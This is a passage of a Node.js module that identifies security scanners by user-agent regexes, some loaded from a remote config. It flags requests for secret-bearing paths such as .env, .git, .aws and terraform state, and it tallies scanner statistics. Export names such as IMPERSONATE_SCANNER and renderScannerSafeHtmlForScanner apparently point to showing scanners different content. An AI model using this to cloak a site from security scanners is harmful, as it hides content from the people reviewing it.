  ...((SCANNER_PATTERNS.uaRegexes || []).map(re => ({
    pattern: re,
    name: 'UA regex',
    confidence: 0.9,
    type: 'generic'
  }))),

  // turn each UA substring into a case-insensitive regex entry
  ...((SCANNER_PATTERNS.uaSubstrings || []).map(sub => ({
    pattern: new RegExp(sub.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'), 'i'),
    name: 'UA substring',
    confidence: 0.6,
    type: 'generic'
  }))),
];

const SCANNER_INTERSTITIAL_SCOPE = String(process.env.SCANNER_INTERSTITIAL_SCOPE || "high_signal").trim().toLowerCase();

const HIGH_SIGNAL_SCANNER_PATH_PATTERNS = [
  /(^|\/)\.git(\/|$)/i,
  /(^|\/)\.env(\.|$|\/)/i,
  /(^|\/)\.aws(\/|$)/i,
  /(^|\/)terraform(\.tfstate|\.tfvars|\/|$)/i,
  /(^|\/)dockerfile$/i,
  /(^|\/)wp-content\/debug\.log$/i,
  /(^|\/)package-updates(\/|$)/i,
  /(^|\/)__nextjs_action$/i,
  /(^|\/)webhook-waiting(\/|$)/i
];

function shouldServeScannerInterstitial(req) {
  if (SCANNER_INTERSTITIAL_SCOPE === "all") return true;
  const rawUrl = String(req.originalUrl || req.url || req.path || "");
  const pathValue = rawUrl.split("?")[0].toLowerCase();
  return HIGH_SIGNAL_SCANNER_PATH_PATTERNS.some((pattern) => pattern.test(pathValue));
}

const EXTERNAL_SCANNER_CONFIG = String(process.env.eSCANNER_CONFIG_URL || "").trim() || null;
let dynamicScanners = [];
let dynamicResponseHeaders = {};   // <-- NEW: stores headers from external config

// This is the function that was missing
async function loadScannerPatterns() {
  if (EXTERNAL_SCANNER_CONFIG) {
    try {
      const response = await fetchWithRuntimeSpan("scanner_config_fetch", EXTERNAL_SCANNER_CONFIG, {}, process.env.SCANNER_CONFIG_TIMEOUT_MS || 5000);
      const data = await response.json();

      // --- NEW: Convert pattern strings to RegExp objects ---
      const rawPatterns = data.patterns || data || [];
      dynamicScanners = rawPatterns
        .map(item => {
          // If it's an array of strings, convert to RegExp with default confidence/name
          if (typeof item === 'string') {
            try {
              return {
                pattern: new RegExp(item, 'i'),
                confidence: 0.9,
                name: 'External Scanner',
                trustedExternalScanner: true
              };
            } catch (e) {
              return null;
            }
          }
          // If it's an object with a 'pattern' string, convert
          if (item && typeof item.pattern === 'string') {
            try {
              return {
                ...item,
                name: String(item.name || '').trim() || 'External Scanner',
                confidence: normalizeScannerConfidence(item.confidence),
                pattern: new RegExp(item.pattern, 'i'),
                trustedExternalScanner: true
              };
            } catch (e) {
              return null;
            }
          }
          // If pattern is already a RegExp (unlikely from JSON), keep it
          return item;
        })
        .filter(item => item && item.pattern instanceof RegExp);
      // -------------------------------------------------------

      // Rebuild responseHeaders from the latest successful config so removed
      // external profiles do not remain selectable with stale headers after reloads.
      const nextDynamicResponseHeaders = {};
      if (data.profiles && Array.isArray(data.profiles)) {
        for (const profile of data.profiles) {
          if (profile.name && profile.responseHeaders) {
            nextDynamicResponseHeaders[profile.name] = profile.responseHeaders;
          }
        }
      }
      dynamicResponseHeaders = nextDynamicResponseHeaders;
      addLog(`[SCANNER] Loaded ${dynamicScanners.length} external scanner patterns and ${Object.keys(dynamicResponseHeaders).length} dynamic header profiles`);
    } catch (error) {
      addLog(`[SCANNER] Failed to load external patterns: ${error.message}`);
    }
  }
}

// Automatically reload the config every 10 minutes
setInterval(loadScannerPatterns, eSCANNER_CONFIG_RELOAD_MS);

function compareScannerDetections(a, b) {
  const confidenceDelta = Number(b && b.confidence || 0.5) - Number(a && a.confidence || 0.5);
  if (confidenceDelta !== 0) return confidenceDelta;

  const trustedExternalDelta = Number(Boolean(b && b.trustedExternalScanner)) - Number(Boolean(a && a.trustedExternalScanner));
  if (trustedExternalDelta !== 0) return trustedExternalDelta;

  const genericDelta = Number(String((a && a.type) || "").toLowerCase() === "generic") - Number(String((b && b.type) || "").toLowerCase() === "generic");
  if (genericDelta !== 0) return genericDelta;

  return 0;
}

function detectScannerEnhanced(req) {
  const ua = String((req && req.get && req.get("user-agent")) || ((req && req.headers) || {})["user-agent"] || "").toLowerCase();
  const ip = getClientIp(req);

  let detected = [];
  const allPatterns = [...SCANNER_PATTERNS_LIST, ...dynamicScanners];

  for (const scanner of allPatterns) {
    if (!(scanner.pattern instanceof RegExp)) continue; // <-- safe guard
    if (scanner.pattern.test(ua)) {
      detected.push({
        ...scanner,
        matchedString: ua.match(scanner.pattern)[0],
        ip: ip
      });
    }
  }

  return detected.sort(compareScannerDetections);
}

const SCANNER_STATS = { total: 0, byReason: Object.create(null), byReasonCode: Object.create(null), byUA: Object.create(null) };
const SCANNER_DECISION_COUNTERS = Object.create(null);
const OPS_METRICS = {
  requestsByDay: Object.create(null),
  frictionByDay: Object.create(null),
  incidentsByDay: Object.create(null),
  lastUpdatedAt: null
};

function incrementScannerDecisionCounter(name, count = 1) {
  const key = String(name || "").trim();
  if (!key) return;
  SCANNER_DECISION_COUNTERS[key] = (SCANNER_DECISION_COUNTERS[key] || 0) + Number(count || 0);
}

function utcDayStamp(ts = Date.now()) {
  return new Date(ts).toISOString().slice(0, 10);
}

function incrementOpsMetric(map, dayKey, name, count = 1) {
  if (!map[dayKey]) map[dayKey] = Object.create(null);
  map[dayKey][name] = (map[dayKey][name] || 0) + Number(count || 0);
  OPS_METRICS.lastUpdatedAt = new Date().toISOString();
}

function computeScannerStatsFromLogs() {
  const byReason = Object.create(null);
  const byUA = Object.create(null);
  let total = 0;

  const logLines = Array.isArray(LOGS) ? LOGS : [];
  for (const line of logLines) {
    if (!line || typeof line !== "string") continue;
    if (!line.includes("[SCANNER] 200 interstitial")) continue;

    total += 1;

    let reason = "unknown";
    const rPos = line.indexOf(" reason=");
    if (rPos >= 0) {
      let tail = line.slice(rPos + 8);
      const nPos = tail.indexOf(" nextLen=");
      if (nPos >= 0) tail = tail.slice(0, nPos);
      reason = tail.trim() || "unknown";
    }
    byReason[reason] = (byReason[reason] || 0) + 1;

    let uaKey = "(empty)";
    const uPos = line.indexOf(" uaKey=");
    if (uPos >= 0) {
      let tail = line.slice(uPos + 7);
      const sp = tail.indexOf(" ");
      if (sp >= 0) tail = tail.slice(0, sp);
      uaKey = tail.trim() || "(empty)";
    }
    byUA[uaKey] = (byUA[uaKey] || 0) + 1;
  }

  SCANNER_STATS.total = total;
  SCANNER_STATS.byReason = byReason;
  SCANNER_STATS.byUA = byUA;
  return SCANNER_STATS;
}

function buildOpsScannerStatsForDay(day = utcDayStamp()) {
  const friction = OPS_METRICS.frictionByDay[day] || {};
  const byReason = Object.create(null);
  for (const [key, value] of Object.entries(friction)) {
    if (!key.startsWith("scanner_block_reason_")) continue;
    byReason[key.slice("scanner_block_reason_".length)] = value;
  }
  return {
    day,
    total: friction.scanner_block_total || 0,
    byReason
  };
}

function selectScannerStatsForResponse(logStats = {}, opsStats = {}) {
  const useOpsStats = Number(opsStats.total || 0) > 0;
  return {
    total: useOpsStats ? opsStats.total : (logStats.total || 0),
    byReason: useOpsStats ? (opsStats.byReason || {}) : (logStats.byReason || {})
  };
}

function hashUAForStats(uaRaw) {
  try {
    const ua = (uaRaw || "").toString();
    return crypto.createHash("sha256").update(ua).digest("hex").slice(0, 8);
  } catch {
    return "na";
  }
}


  return {
    IMPERSONATE_SCANNER,
    IMPERSONATE_SCANNER_STRICT,
    IMPERSONATE_MIN_CONFIDENCE,
    SCANNER_GENERIC_PROFILE,
    SCANNER_PROFILES,
    applyScannerProfileHeaders,
    renderScannerSafeHtmlForScanner,
    KNOWN_SCANNER_IPS,
    KNOWN_SCANNER_MAX,
    cleanupKnownScannerIps,
    recordScannerIp,
    isKnownScannerIp,
    pickScannerProfile,
    shouldImpersonateForRequest,
    shouldApplyProfileHeadersForRequest,
    findScannerProfileByName,
    assertScannerFetchTargetAllowed,
    buildPinnedScannerFetchUrl,
    makePinnedScannerRequestWithFallback,
    SCANNER_COMPAT_HEADERS_ENABLED,
    applyScannerCompatHeaders,
    SCANNER_INTERSTITIAL_SCOPE,
    shouldServeScannerInterstitial,
    loadScannerPatterns,
    compareScannerDetections,
    detectScannerEnhanced,
    SCANNER_STATS,
    SCANNER_DECISION_COUNTERS,
    OPS_METRICS,
    incrementScannerDecisionCounter,
    utcDayStamp,
    incrementOpsMetric,
    computeScannerStatsFromLogs,
    buildOpsScannerStatsForDay,
    selectScannerStatsForResponse,
    hashUAForStats
  };
}

module.exports = createScannerDetection;
